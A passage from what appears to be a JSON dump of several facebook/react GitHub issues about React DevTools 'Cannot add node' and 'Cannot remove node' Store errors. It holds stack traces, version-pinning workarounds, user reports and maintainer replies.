{"repo": "facebook/react", "issue_number": 23226, "issue_url": "https://github.com/facebook/react/issues/23226", "issue_title": "[DevTools Bug] Cannot add node \"1\" because a node with that id is already in the Store.", "issue_author": "spolesciuc", "issue_body": "### Repro steps\r\n\r\n  \r\n  \"react\": \"17.0.2\",\r\n  \"react-native\": \"0.66.3\",\r\n  \"react-devtools\": \"^4.22.0\",\r\n  \"@react-navigation/devtools\": \"^6.0.5\",\r\n  \"@react-navigation/bottom-tabs\": \"^6.1.0\",\r\n  \"@react-navigation/core\": \"^6.1.1\",\r\n  \"@react-navigation/elements\": \"^1.3.0\",\r\n  \"@react-navigation/native\": \"^6.0.7\",\r\n  \"@react-navigation/native-stack\": \"^6.3.0\",\r\n  \"@react-navigation/routers\": \"^6.1.0\",\r\n  \"@react-navigation/stack\": \"^6.1.0\",\r\n\r\n### How often does this bug happen?\r\n\r\nEvery time\r\n\r\n### DevTools package (automated)\r\n\r\nreact-devtools-core\r\n\r\n### DevTools version (automated)\r\n\r\n4.14.0-d0ec283819\r\n\r\n### Error message (automated)\r\n\r\nCannot add node \"1\" because a node with that id is already in the Store.\r\n\r\n### Error call stack (automated)\r\n\r\n```text\r\nat /Applications/React Native Debugger.app/Contents/Resources/app.asar/node_modules/react-devtools-core/dist/standalone.js:48:140545\r\n    at c.emit (/Applications/React Native Debugger.app/Contents/Resources/app.asar/node_modules/react-devtools-core/dist/standalone.js:48:89515)\r\n    at /Applications/React Native Debugger.app/Contents/Resources/app.asar/node_modules/react-devtools-core/dist/standalone.js:48:90986\r\n    at /Applications/React Native Debugger.app/Contents/Resources/app.asar/node_modules/react-devtools-core/dist/standalone.js:48:347787\r\n    at Array.forEach (<anonymous>)\r\n    at S.Gc.e.onmessage (/Applications/React Native Debugger.app/Contents/Resources/app.asar/node_modules/react-devtools-core/dist/standalone.js:48:347771)\r\n    at S.n (/Applications/React Native Debugger.app/Contents/Resources/app.asar/node_modules/react-devtools-core/dist/standalone.js:40:3009)\r\n    at S.emit (events.js:315:20)\r\n    at e.exports.P (/Applications/React Native Debugger.app/Contents/Resources/app.asar/node_modules/react-devtools-core/dist/standalone.js:8:9318)\r\n    at e.exports.emit (events.js:315:20)\r\n    at e.exports.dataMessage (/Applications/React Native Debugger.app/Contents/Resources/app.asar/node_modules/react-devtools-core/dist/standalone.js:8:15409)\r\n    at e.exports.getData (/Applications/React Native Debugger.app/Contents/Resources/app.asar/node_modules/react-devtools-core/dist/standalone.js:8:14651)\r\n    at e.exports.startLoop (/Applications/React Native Debugger.app/Contents/Resources/app.asar/node_modules/react-devtools-core/dist/standalone.js:8:12066)\r\n    at e.exports._write (/Applications/React Native Debugger.app/Contents/Resources/app.asar/node_modules/react-devtools-core/dist/standalone.js:8:11421)\r\n    at doWrite (_stream_writable.js:403:12)\r\n    at writeOrBuffer (_stream_writable.js:387:5)\r\n```\r\n\r\n\r\n### Error component stack (automated)\r\n\r\n_No response_\r\n\r\n### GitHub query string (automated)\r\n\r\n```text\r\nhttps://api.github.com/search/issues?q=Cannot add node  because a node with that id is already in the Store. in:title is:issue is:open is:public label:\"Component: Developer Tools\" repo:facebook/react\r\n```\r\n", "issue_labels": ["Type: Bug", "Resolution: Needs More Information", "Component: Developer Tools"], "comments": [{"author": "lunaruan", "body": "Hey! Thanks for reporting this issue, and I'm really sorry you encountered it. However, without a repro case we're not able to address this. Could you create a codesandbox or a create-react-app repro case for us so we can debug and fix your issue? Thanks!"}, {"author": "prabhg", "body": "I believe this is the same issue as reported in RN Debugger GH: https://github.com/jhen0409/react-native-debugger/issues/668"}, {"author": "muhammadRooman", "body": "\r\ni am facing this issue please guide me whats a problem in my devtools.............\r\n\r\n\r\n.................................................\r\nUncaught Error: Cannot add node \"1\" because a node with that id is already in the Store.\r\n\r\nThe error was thrown at chrome-extension://fmkadmapgofadopljbjfkapdkoienihi/build/main.js:26229:41\r\n    at bridge_Bridge.emit (chrome-extension://fmkadmapgofadopljbjfkapdkoienihi/build/main.js:24415:22)\r\n    at chrome-extension://fmkadmapgofadopljbjfkapdkoienihi/build/main.js:24581:14\r\n    at listener (chrome-extension://fmkadmapgofadopljbjfkapdkoienihi/build/main.js:54033:39)"}, {"author": "afilp", "body": "I have the same issue, any ideas what should we do? Thanks a lot."}, {"author": "vijaynyaya", "body": "le m\u00eame probl\u00e8me.\r\n`Uncaught Error: Cannot add node \"1931\" because a node with that id is already in the Store.`"}, {"author": "x1unix", "body": "I have the same issue in [my project](https://goplay.tools/)\r\n\r\n`Uncaught Error: Cannot add node \"1\" because a node with that id is already in the Store.`"}, {"author": "rudriken", "body": "I'm also having the same problem."}, {"author": "bwhitt", "body": "Same issue for me - RN v0.64.3  RND v0.12.1"}, {"author": "jonoise", "body": "I see this issue is recent. Idk what the outcome of this will be, but I've avoid getting this error.\r\ncheck if you are mapping an array making use of its `index` param to set it as key prop.\r\n```js\r\nar.map((obj, index) => ... )\r\n```\r\nif so, try to avoid it. **dont** use index as key. give your object an id or other kind of unique identifier as key prop."}, {"author": "MalinnaLeach", "body": "I am facing this same issue, I have upgraded both react-devtools and react-devtools-core to 4.23.0, and we are not using index as a key anywhere in our codebase."}, {"author": "MalinnaLeach", "body": "OK, I have fixed this for myself by adding this into our package.json:\r\n\r\n` \"resolutions\": {\r\n    \"react-devtools-core\": \"4.14.0\"\r\n  },\r\n `\r\n I found the solution in this thread:  https://github.com/jhen0409/react-native-debugger/issues/620"}, {"author": "oldskoolfan", "body": "thank you @MalinnaLeach you helped me as well"}, {"author": "NaingLinnKyaw", "body": "> ### Repro steps\r\n> \"react\": \"17.0.2\", \"react-native\": \"0.66.3\", \"react-devtools\": \"^4.22.0\", \"@react-navigation/devtools\": \"^6.0.5\", \"@react-navigation/bottom-tabs\": \"^6.1.0\", \"@react-navigation/core\": \"^6.1.1\", \"@react-navigation/elements\": \"^1.3.0\", \"@react-navigation/native\": \"^6.0.7\", \"@react-navigation/native-stack\": \"^6.3.0\", \"@react-navigation/routers\": \"^6.1.0\", \"@react-navigation/stack\": \"^6.1.0\",\r\n> \r\n> ### How often does this bug happen?\r\n> Every time\r\n> \r\n> ### DevTools package (automated)\r\n> react-devtools-core\r\n> \r\n> ### DevTools version (automated)\r\n> 4.14.0-d0ec283819\r\n> \r\n> ### Error message (automated)\r\n> Cannot add node \"1\" because a node with that id is already in the Store.\r\n> \r\n> ### Error call stack (automated)\r\n> ```\r\n> at /Applications/React Native Debugger.app/Contents/Resources/app.asar/node_modules/react-devtools-core/dist/standalone.js:48:140545\r\n>     at c.emit (/Applications/React Native Debugger.app/Contents/Resources/app.asar/node_modules/react-devtools-core/dist/standalone.js:48:89515)\r\n>     at /Applications/React Native Debugger.app/Contents/Resources/app.asar/node_modules/react-devtools-core/dist/standalone.js:48:90986\r\n>     at /Applications/React Native Debugger.app/Contents/Resources/app.asar/node_modules/react-devtools-core/dist/standalone.js:48:347787\r\n>     at Array.forEach (<anonymous>)\r\n>     at S.Gc.e.onmessage (/Applications/React Native Debugger.app/Contents/Resources/app.asar/node_modules/react-devtools-core/dist/standalone.js:48:347771)\r\n>     at S.n (/Applications/React Native Debugger.app/Contents/Resources/app.asar/node_modules/react-devtools-core/dist/standalone.js:40:3009)\r\n>     at S.emit (events.js:315:20)\r\n>     at e.exports.P (/Applications/React Native Debugger.app/Contents/Resources/app.asar/node_modules/react-devtools-core/dist/standalone.js:8:9318)\r\n>     at e.exports.emit (events.js:315:20)\r\n>     at e.exports.dataMessage (/Applications/React Native Debugger.app/Contents/Resources/app.asar/node_modules/react-devtools-core/dist/standalone.js:8:15409)\r\n>     at e.exports.getData (/Applications/React Native Debugger.app/Contents/Resources/app.asar/node_modules/react-devtools-core/dist/standalone.js:8:14651)\r\n>     at e.exports.startLoop (/Applications/React Native Debugger.app/Contents/Resources/app.asar/node_modules/react-devtools-core/dist/standalone.js:8:12066)\r\n>     at e.exports._write (/Applications/React Native Debugger.app/Contents/Resources/app.asar/node_modules/react-devtools-core/dist/standalone.js:8:11421)\r\n>     at doWrite (_stream_writable.js:403:12)\r\n>     at writeOrBuffer (_stream_writable.js:387:5)\r\n> ```\r\n> \r\n> ### Error component stack (automated)\r\n> _No response_\r\n> \r\n> ### GitHub query string (automated)\r\n> ```\r\n> https://api.github.com/search/issues?q=Cannot add node  because a node with that id is already in the Store. in:title is:issue is:open is:public label:\"Component: Developer Tools\" repo:facebook/react\r\n> ```help\r\n\r\n"}, {"author": "rgomezp", "body": "Also facing this issue\r\n"}, {"author": "gaearon", "body": "We can't help without a **reproducing case**.\r\n\r\nPlease only add a comment if you can provide one. Thanks!"}, {"author": "jlordi70", "body": "I am also having this issue.  Steps I used to reproduce:\r\n1.  npx react-native init ReactNativeDebuggerTest\r\n2.  npm i react-native-port-patcher\r\n3.  Add following line to package.json files under scripts: \"postinstall\": \"react-native-port-patcher --new-port 8088\",\r\n4.  npx react-native run-android --verbose --port 8088 \r\n5.  Change Debug server host & port for device to: localhost:8088\r\n6. Turn on Debug\r\n\r\nHere is my repository: https://github.com/jlordi70/ReactNativeDebuggerIssue.git\r\nOther than the port patcher, I have not changed any code.\r\n\r\nPlease let me know if you need any other information.\r\n\r\nThank You In Advance!"}, {"author": "adipascu", "body": "This is happening to me while having `import 'react-devtools'` in the app and running it in Google Chrome while it has the React Dev Tools extension installed.\r\n\r\nSeems like having two devtool instances attached to the same app is also causing this bug."}, {"author": "lunaruan", "body": "For those of you on React Native with this issue, this could be because your DevTools backend in React Native (`react-devtools-core`) is incompatible with the React DevTools front end. Could you upgrade (or downgrade) the two so that the versions match and see if you can reproduce this issue?\r\n\r\nWe have a PR out that warns if the DevTools backend and front end versions mismatch, but it's only available as of v4.24.3 so you might not see if it you are on older versions."}, {"author": "zhangsenhua", "body": "I'm also having the same problem."}, {"author": "erquhart", "body": "Guessing a lot of folks are commenting without a repro because the debugger is linking to this issue with instructions to add a comment in large bold font, easy to miss the rest about providing a repro case and it's a confusing bug.\r\n\r\nFor React Native npm users that can't use the resolutions workaround mentioned elsewhere (only works for yarn), try installing the devtools and core direct in your project (not global):\r\n\r\n```\r\nnpm install --save-dev react-devtools@4.14.0 react-devtools-core@4.14.0\r\n```\r\n\r\nIt's possible you may only need the core package, but installing both didn't hurt for me."}, {"author": "jlordi70", "body": "> Guessing a lot of folks are commenting without a repro because the debugger is linking to this issue with instructions to add a comment in large bold font, easy to miss the rest about providing a repro case and it's a confusing bug.\r\n> \r\n> For React Native npm users that can't use the resolutions workaround mentioned elsewhere (only works for yarn), try installing the devtools and core direct in your project (not global):\r\n> \r\n> ```\r\n> npm install --save-dev react-devtools@4.14.0 react-devtools-core@4.14.0\r\n> ```\r\n> \r\n> It's possible you may only need the core package, but installing both didn't hurt for me.\r\n\r\nI tried that and it still did not work.  \r\n\r\nI provided a repo above: https://github.com/jlordi70/ReactNativeDebuggerIssue.git\r\n\r\n![ReactNative Debugger](https://user-images.githubusercontent.com/73319310/163867220-f32f452c-6fb8-4eee-abd3-f60a94b076a9.PNG)\r\n\r\nPackage,json file \r\n...\r\n    \"devDependencies\": {\r\n    \"@babel/core\": \"^7.12.9\",\r\n    \"@babel/runtime\": \"^7.12.5\",\r\n    \"@react-native-community/eslint-config\": \"^2.0.0\",\r\n    \"babel-jest\": \"^26.6.3\",\r\n    \"eslint\": \"^7.32.0\",\r\n    \"jest\": \"^26.6.3\",\r\n    \"metro-react-native-babel-preset\": \"^0.67.0\",\r\n    \"react-devtools\": \"^4.14.0\",\r\n    \"react-devtools-core\": \"^4.14.0\",\r\n    \"react-native-port-patcher\": \"^1.0.4\",\r\n    \"react-test-renderer\": \"17.0.2\"\r\n  },"}, {"author": "jlordi70", "body": "@lunaruan \r\nThere is a repo that I was getting the issue on.  I am hoping you can look at this.  Thanks In Advance.\r\n\r\nhttps://github.com/jlordi70/ReactNativeDebuggerIssue.git"}, {"author": "akhilbellam95", "body": "> Guessing a lot of folks are commenting without a repro because the debugger is linking to this issue with instructions to add a comment in large bold font, easy to miss the rest about providing a repro case and it's a confusing bug.\r\n> \r\n> For React Native npm users that can't use the resolutions workaround mentioned elsewhere (only works for yarn), try installing the devtools and core direct in your project (not global):\r\n> \r\n> ```\r\n> npm install --save-dev react-devtools@4.14.0 react-devtools-core@4.14.0\r\n> ```\r\n> \r\n> It's possible you may only need the core package, but installing both didn't hurt for me.\r\n\r\nI am also facing the same issue\r\nTried the above solution"}, {"author": "lunaruan", "body": "@jlordi70 I tried to reproduce the issue with your repro case but I couldn't. Could you manually upgrade both your `react-devtools` package as well as the `react-devtools-core` dependency (in `node_module`, which the `react-native` package needs) to `4.24.0` and see if this fixes your issue?"}, {"author": "pavelgronsky", "body": "Hey everyone!!!\r\n\r\n[This is my solution](https://gist.github.com/bvaughn/4bc90775530873fdf8e7ade4a039e579?permalink_comment_id=4163357#gistcomment-4163357)"}, {"author": "dmitryou", "body": "In my case reinstalling of react-native-debuger to newer version solved the issue\r\n\r\n> Homebrew 2.6.0 and higher\r\nbrew reinstall --cask react-native-debugger\r\n\r\nIf you face permission issue, just remove debugger manually and reinstall"}, {"author": "kamranayub", "body": "This is new as of either 4.27.0 or 4.27.1 as I haven't changed any code in the repo since Nov 18 when I was using 4.26.1 to record a course. You can [see a snapshot preview site](https://3fc50a25.pluralsight-course-react-debugging.pages.dev/) here where there are issues.\r\n\r\nSpecifically, this issue seems to be random -- I only saw it once, but I think it's due to the devtools not loading immediately and timing out. \r\n\r\nTo reproduce:\r\n\r\n1. Load the page\r\n2. Hit F12 to open Chrome devtools\r\n3. Observe if React extension icon is still greyed out\r\n4. Click React extension icon\r\n5. Observe how Components/Profiler tabs show up\r\n6. Click Components tab\r\n7. Observe it keeps spinning on loading\r\n8. Click the React extension icon again\r\n9. Now the tree loads\r\n\r\n## Video\r\n\r\nI recorded a clip because it's BONKERS to try and describe \ud83d\ude04 \r\n\r\nhttps://user-images.githubusercontent.com/563819/207508254-6bd10f70-2016-4e8a-b3d7-35140f6d7004.mp4\r\n\r\n## Screenshots\r\n\r\nDevTools greyed out initially (not always the case but happens during the video)\r\n\r\n![image](https://user-images.githubusercontent.com/563819/207505520-c404bb81-ab1c-45c4-9325-68f5467b8bb8.png)\r\n\r\nAnd when it does work, I started seeing another issue while debugging the app (couldn't repro in video):\r\n\r\n![image](https://user-images.githubusercontent.com/563819/207504593-282a2a8f-6b16-47c7-8823-925217a1877e.png)\r\n\r\n## Workaround\r\n\r\nI noticed if I click the React extension icon a few times with the developer tools open, it loads much faster and doesn't time out \ud83e\udd14 \r\n\r\nI am using CRA with Chrome Devtools, no RN at all.\r\n\r\n- Chrome 108.0.5359.96\r\n- DevTools 4.27.1-47f63dc54\r\n\r\nAs for the root cause, I don't know exactly but if I had to bet \ud83d\udcb0 then my bet is on this (big PR, new feature, device storage related, possible async/timeout issues): https://github.com/facebook/react/pull/25452\r\n\r\n**edit:** I looked around at the commits/PRs and did some limited testing but I'm not so sure now, maybe it was introduced elsewhere.\r\n\r\nHope that helps @gaearon!\r\n\r\nI can confirm on my separate Chrome profile using 4.25.0 everything is working, so I will plan to revert to that in the meantime."}, {"author": "kamranayub", "body": "Now that I see it, between 4.25.0 and 4.27.1, there was an update to the V3 manifest:\r\n\r\nhttps://github.com/facebook/react/commit/6dbccb92493c3a4fea14b6832ceb4ac42e6330c1 (PR https://github.com/facebook/react/pull/25145)\r\n\r\nThat could explain the issue.\r\n\r\nFor now I am using unpacked 4.25.0, from [crx4chrome](https://www.crx4chrome.com/history/3068/)."}, {"author": "MarthL", "body": "> OK, I have fixed this for myself by adding this into our package.json:\r\n> \r\n> `\"resolutions\": { \"react-devtools-core\": \"4.14.0\" },` I found the solution in this thread: [jhen0409/react-native-debugger#620](https://github.com/jhen0409/react-native-debugger/issues/620)\r\n\r\nIn my case this solution has worked for me "}, {"author": "tayrotayro", "body": "I got this error but I turned off the extension, closed the browser, reopened the browser, turned the extension back on, and then it worked!"}]}
{"repo": "facebook/react", "issue_number": 27121, "issue_url": "https://github.com/facebook/react/issues/27121", "issue_title": "[DevTools Bug] Cannot add node \"1\" because a node with that id is already in the Store.", "issue_author": "amrsmind", "issue_body": "### Website or app\n\nreact-devtools with expo\n\n### Repro steps\n\nOnce react-devtools run this happen there \n\n### How often does this bug happen?\n\nEvery time\n\n### DevTools package (automated)\n\nreact-devtools-core\n\n### DevTools version (automated)\n\n4.13.5-0ae5290b54\n\n### Error message (automated)\n\nCannot add node \"1\" because a node with that id is already in the Store.\n\n### Error call stack (automated)\n\n```text\nat /Users/amr/.config/yarn/global/node_modules/react-devtools-core/dist/standalone.js:48:139060\r\n    at c.emit (/Users/amr/.config/yarn/global/node_modules/react-devtools-core/dist/standalone.js:48:88052)\r\n    at /Users/amr/.config/yarn/global/node_modules/react-devtools-core/dist/standalone.js:48:89523\r\n    at /Users/amr/.config/yarn/global/node_modules/react-devtools-core/dist/standalone.js:48:341120\r\n    at Array.forEach (<anonymous>)\r\n    at S.Vc.e.onmessage (/Users/amr/.config/yarn/global/node_modules/react-devtools-core/dist/standalone.js:48:341104)\r\n    at S.n (/Users/amr/.config/yarn/global/node_modules/react-devtools-core/dist/standalone.js:40:2971)\r\n    at S.emit (events.js:315:20)\r\n    at e.exports.P (/Users/amr/.config/yarn/global/node_modules/react-devtools-core/dist/standalone.js:8:9318)\r\n    at e.exports.emit (events.js:315:20)\n```\n\n\n### Error component stack (automated)\n\n_No response_\n\n### GitHub query string (automated)\n\n```text\nhttps://api.github.com/search/issues?q=Cannot add node  because a node with that id is already in the Store. in:title is:issue is:open is:public label:\"Component: Developer Tools\" repo:facebook/react\n```\n", "issue_labels": ["Type: Bug", "Status: Unconfirmed", "Component: Developer Tools"], "comments": [{"author": "kiliancs", "body": "I just run into this using Firefox.\r\n\r\n```\r\nThe error was thrown emit@moz-extension://57001395-8940-45ea-8bc9-bae1a432b322/build/main.js:27059:22\r\nbridge_Bridge/this._wallUnlisten<@moz-extension://57001395-8940-45ea-8bc9-bae1a432b322/build/main.js:27228:14\r\nlistener@moz-extension://57001395-8940-45ea-8bc9-bae1a432b322/build/main.js:57497:41\r\n```"}, {"author": "Truiteseche", "body": "Yeah I also ran into this error using Edge (Chromium):\r\n```The error was thrown at chrome-extension://gpphkfbcpidddadnkolkpfckpihlkkil/build/main.js:28171:41\r\n    at Bridge.emit (chrome-extension://gpphkfbcpidddadnkolkpfckpihlkkil/build/main.js:24827:22)\r\n    at chrome-extension://gpphkfbcpidddadnkolkpfckpihlkkil/build/main.js:24996:14\r\n    at listener (chrome-extension://gpphkfbcpidddadnkolkpfckpihlkkil/build/main.js:57406:39)```"}, {"author": "zaqqaz", "body": "same issue when have multiple iframes and fix like for the iframe support \r\n```\r\nif (window.parent !== window && !!window.parent.__REACT_DEVTOOLS_GLOBAL_HOOK__) {\r\n      window.__REACT_DEVTOOLS_GLOBAL_HOOK__ = window.parent.__REACT_DEVTOOLS_GLOBAL_HOOK__;\r\n}\r\n```\r\n\r\nso let me link it with: https://github.com/facebook/react/issues/18945"}, {"author": "kweh", "body": "Got this while refreshing minimal react app with just a single username/password form:\r\n```\r\nThe error was thrown at chrome-extension://fmkadmapgofadopljbjfkapdkoienihi/build/main.js:28171:41\r\n    at Bridge.emit (chrome-extension://fmkadmapgofadopljbjfkapdkoienihi/build/main.js:24827:22)\r\n    at chrome-extension://fmkadmapgofadopljbjfkapdkoienihi/build/main.js:24996:14\r\n    at listener (chrome-extension://fmkadmapgofadopljbjfkapdkoienihi/build/main.js:57406:39)\r\n```"}, {"author": "eps1lon", "body": "We fixed some scenarios where this could occur in React DevTools 7.0. If this issue still persists, please open a new issue."}]}
{"repo": "facebook/react", "issue_number": 30577, "issue_url": "https://github.com/facebook/react/issues/30577", "issue_title": "[DevTools Bug] Cannot remove node \"366\" because no matching node was found in the Store.", "issue_author": "vanshnayak2002", "issue_body": "### Website or app\n\nhttp://localhost:3000/welcome\n\n### Repro steps\n\n### I created token for user authentication and pass into context so that user can reuse that token to call an API \r\nwhen i logout or login on my localhost i see this error \r\n\r\n**STEP 1 Create a token** \r\nexport const executeBasicAuthenticationService\r\n    = (token) => apiClient.get(`/basicauth`,{\r\n        headers: {\r\n            Authorization: token\r\n        }\r\n    })\r\n\r\n**STEP-2 Pass into context**\r\n\r\nasync function login(username, password) {\r\n\r\n\r\n\r\n  const baToken = 'Basic ' + window.btoa( username + \":\" + password )\r\n  \r\n  try{\r\n\r\n  \r\n  const response = await executeBasicAuthenticationService(baToken)\r\n  \r\n  if(response.status==200){\r\n        setAuthenticated(true)\r\n        setUsername(username)\r\n        settoken(baToken)\r\n         return true\r\n       \r\n    } else {\r\n       logout()\r\n        return false\r\n      \r\n     }\r\n}  catch(error){\r\n  logout()\r\n  return false\r\n}\r\n\r\n }\r\n\r\nfunction logout(){\r\nsetAuthenticated(false)\r\nsettoken(null)\r\nsetUsername(null)\r\n}\r\n\r\n    return (\r\n  <AuthContext.Provider value={ {isAuthenticated,setAuthenticated,login,logout,username,token} }>\r\n\r\n    {children}\r\n  </AuthContext.Provider>\r\n\r\n\r\n    )\r\n}\r\n\r\n    \n\n### How often does this bug happen?\n\nEvery time\n\n### DevTools package (automated)\n\nreact-devtools-extensions\n\n### DevTools version (automated)\n\n5.3.1-ccb20cb88b\n\n### Error message (automated)\n\nCannot remove node \"366\" because no matching node was found in the Store.\n\n### Error call stack (automated)\n\n```text\nat chrome-extension://fmkadmapgofadopljbjfkapdkoienihi/build/main.js:1:1174132\r\n    at v.emit (chrome-extension://fmkadmapgofadopljbjfkapdkoienihi/build/main.js:1:1141877)\r\n    at chrome-extension://fmkadmapgofadopljbjfkapdkoienihi/build/main.js:1:1143565\r\n    at bridgeListener (chrome-extension://fmkadmapgofadopljbjfkapdkoienihi/build/main.js:1:1551564)\n```\n\n\n### Error component stack (automated)\n\n_No response_\n\n### GitHub query string (automated)\n\n```text\nhttps://api.github.com/search/issues?q=Cannot remove node  because no matching node was found in the Store. in:title is:issue is:open is:public label:\"Component: Developer Tools\" repo:facebook/react\n```\n", "issue_labels": ["Type: Bug", "Status: Unconfirmed", "Component: Developer Tools"], "comments": [{"author": "champagnekamal", "body": "export const executeBasicAuthenticationService\r\n= (token) => apiClient.get(/basicauth,{\r\nheaders: {\r\nAuthorization: token\r\n}\r\n})\r\n\r\nare you even returning the response\r\n\r\n\r\nelse {\r\n   logout()\r\n    return false\r\n  \r\n }\r\n} catch(error){\r\nlogout()\r\nreturn false\r\n}\r\n\r\nalso in this case your execution is going in else and running logout and then also because it's an error its again going in catch and again running logout which cause the \r\nCannot remove node \"366\" because no matching node was found in the Store."}, {"author": "champagnekamal", "body": "http://localhost:3000/welcome\r\n\r\nand also you cant share a localhost for others to see localhost will only work on your system. \r\nto share with others you need to deploy, you can do that on github pages or netlify."}, {"author": "eps1lon", "body": "We fixed some scenarios where this could occur in React DevTools 7.0. If this issue still persists, please open a new issue."}]}
{"repo": "facebook/react", "issue_number": 30607, "issue_url": "https://github.com/facebook/react/issues/30607", "issue_title": "[DevTools Bug] Cannot add node \"1\" because a node with that id is already in the Store.", "issue_author": "arvindhcm", "issue_body": "### Website or app\n\nlocal repo\n\n### Repro steps\n\njust loaded the local  react app\n\n### How often does this bug happen?\n\nEvery time\n\n### DevTools package (automated)\n\nreact-devtools-extensions\n\n### DevTools version (automated)\n\n5.3.1-ccb20cb88b\n\n### Error message (automated)\n\nCannot add node \"1\" because a node with that id is already in the Store.\n\n### Error call stack (automated)\n\n```text\nat chrome-extension://fmkadmapgofadopljbjfkapdkoienihi/build/main.js:1:1172435\r\n    at v.emit (chrome-extension://fmkadmapgofadopljbjfkapdkoienihi/build/main.js:1:1141877)\r\n    at chrome-extension://fmkadmapgofadopljbjfkapdkoienihi/build/main.js:1:1143565\r\n    at bridgeListener (chrome-extension://fmkadmapgofadopljbjfkapdkoienihi/build/main.js:1:1551564)\n```\n\n\n### Error component stack (automated)\n\n_No response_\n\n### GitHub query string (automated)\n\n```text\nhttps://api.github.com/search/issues?q=Cannot add node  because a node with that id is already in the Store. in:title is:issue is:open is:public label:\"Component: Developer Tools\" repo:facebook/react\n```\n", "issue_labels": ["Type: Bug", "Status: Unconfirmed", "Component: Developer Tools"], "comments": [{"author": "Marvinrose", "body": "Hello,\r\nI\u2019m interested in working on this issue. Before I do so, I wanted to check if anyone is currently working on it or if there are any ongoing discussions that I should be aware of.\r\nIf it's available, I\u2019d love to take a look and contribute. Please let me know!\r\nThanks!\r\n"}, {"author": "eric-gitta-moore", "body": "+1\r\nI'm followed https://zh-hans.react.dev/learn/react-developer-tools#safari-and-other-browsers\r\n\r\n```\r\nUncaught Error: \r\nCannot add node \"1\" because a node with that id is already in the Store.\r\n```\r\n\r\n```\r\nThe error was thrown \r\nat /Users/admin/.nvm/versions/node/v20.14.0/lib/node_modules/react-devtools/node_modules/react-devtools-core/dist/standalone.js:2:1043404\r\n    at f.emit (/Users/admin/.nvm/versions/node/v20.14.0/lib/node_modules/react-devtools/node_modules/react-devtools-core/dist/standalone.js:2:989541)\r\n    at /Users/admin/.nvm/versions/node/v20.14.0/lib/node_modules/react-devtools/node_modules/react-devtools-core/dist/standalone.js:2:991083\r\n    at /Users/admin/.nvm/versions/node/v20.14.0/lib/node_modules/react-devtools/node_modules/react-devtools-core/dist/standalone.js:2:1392030\r\n    at Array.forEach (<anonymous>)\r\n    at e.onmessage (/Users/admin/.nvm/versions/node/v20.14.0/lib/node_modules/react-devtools/node_modules/react-devtools-core/dist/standalone.js:2:1392013)\r\n    at H.s (/Users/admin/.nvm/versions/node/v20.14.0/lib/node_modules/react-devtools/node_modules/react-devtools-core/dist/standalone.js:2:404466)\r\n    at H.emit (node:events:513:28)\r\n    at e.exports.B (/Users/admin/.nvm/versions/node/v20.14.0/lib/node_modules/react-devtools/node_modules/react-devtools-core/dist/standalone.js:2:438611)\r\n    at e.exports.emit (node:events:513:28)\r\n\r\n```"}, {"author": "stealth90", "body": "+1"}, {"author": "ramansaini14", "body": "+1\r\n"}, {"author": "Not-James-Bond", "body": "+1 .Facing this with Firefox.\r\n\r\n\r\n`\r\nUncaught Error: Cannot add node \"1\" because a node with that id is already in the Store.\r\n`\r\n\r\n`\r\nThe error was thrown emit@moz-extension://35d01427-9a13-4135-8eff-8ba691c5a227/build/main.js:1:1141877\r\nv/this._wallUnlisten<@moz-extension://35d01427-9a13-4135-8eff-8ba691c5a227/build/main.js:1:1143565\r\nbridgeListener@moz-extension://35d01427-9a13-4135-8eff-8ba691c5a227/build/main.js:1:1551393\r\n`\r\n"}, {"author": "jasperfernandez", "body": "+1 Facing this with Microsoft Edge"}, {"author": "konoufo", "body": "+1"}, {"author": "KunalSukhija-Fareye", "body": "+1 facing in Google Chrome\r\n"}, {"author": "RPSingh0", "body": "+1 Facing this issue in Microsoft Edge"}, {"author": "kayquealmeida", "body": "+1 facing this issue in Edge"}, {"author": "GLEF1X", "body": "+1 facing this issue in Google Chrome Version 128.0.6613.138 (Official Build) (arm64)"}, {"author": "ZandercraftGames", "body": "+1 Facing this issue in Brave browser\r\n```\r\n1.69.168 Chromium: 128.0.6613.138 (Official Build) (64-bit)\r\nWindows 11 Version 23H2 (Build 22631.4169)\r\n```"}, {"author": "eps1lon", "body": "We fixed some scenarios where this could occur in React DevTools 7.0. If this issue still persists, please open a new issue."}]}
{"repo": "facebook/react", "issue_number": 31086, "issue_url": "https://github.com/facebook/react/issues/31086", "issue_title": "[DevTools Bug] Cannot add node \"20468\" because a node with that id is already in the Store.", "issue_author": "NirnayK", "issue_body": "### Website or app\n\nhttps://demo.ragflow.io/\n\n### Repro steps\n\nLogin into the site and checkout components at any page. The error will pop up.\n\n### How often does this bug happen?\n\nEvery time\n\n### DevTools package (automated)\n\nreact-devtools-extensions\n\n### DevTools version (automated)\n\n5.3.1-ccb20cb88b\n\n### Error message (automated)\n\nCannot add node \"20468\" because a node with that id is already in the Store.\n\n### Error call stack (automated)\n\n```text\nat chrome-extension://fmkadmapgofadopljbjfkapdkoienihi/build/main.js:1:1172435\r\n    at v.emit (chrome-extension://fmkadmapgofadopljbjfkapdkoienihi/build/main.js:1:1141877)\r\n    at chrome-extension://fmkadmapgofadopljbjfkapdkoienihi/build/main.js:1:1143565\r\n    at bridgeListener (chrome-extension://fmkadmapgofadopljbjfkapdkoienihi/build/main.js:1:1551564)\n```\n\n\n### Error component stack (automated)\n\n_No response_\n\n### GitHub query string (automated)\n\n```text\nhttps://api.github.com/search/issues?q=Cannot add node  because a node with that id is already in the Store. in:title is:issue is:open is:public label:\"Component: Developer Tools\" repo:facebook/react\n```\n", "issue_labels": ["Type: Bug", "Status: Unconfirmed", "Component: Developer Tools"], "comments": [{"author": "neeraj03788", "body": "Hey I am not getting your issue could you brief that?\r\n"}, {"author": "NigeAtAnd", "body": "I've seen it a few times now, developing a React Native Expo app using Expo Go. I reload the app with DevTools open and I get this error.\r\n\r\n```\r\nUncaught Error: Cannot add node \"1734\" because a node with that id is already in the Store.\r\nDismiss\r\nThe error was thrown at http://192.168.0.66:8081/_expo/react-devtools/standalone.js:2:1011371\r\n    at f.emit (http://192.168.0.66:8081/_expo/react-devtools/standalone.js:2:984358)\r\n    at http://192.168.0.66:8081/_expo/react-devtools/standalone.js:2:985900\r\n    at http://192.168.0.66:8081/_expo/react-devtools/standalone.js:2:1359186\r\n    at Array.forEach (<anonymous>)\r\n    at U_.e.onmessage (http://192.168.0.66:8081/_expo/react-devtools/standalone.js:2:1359169)\r\n```\r\n\r\nRefreshing DevTools doesn't help. \r\n\r\nMacOS Sonoma 14.7\r\nDevTools 5.2.0-1717ab0171\r\nChrome 129.0.6668.101 x86_64\r\nreact 18.2.0\r\nreact-native 0.74.5\r\nexpo 51.0.37"}, {"author": "piecdar", "body": "Uncaught Error: 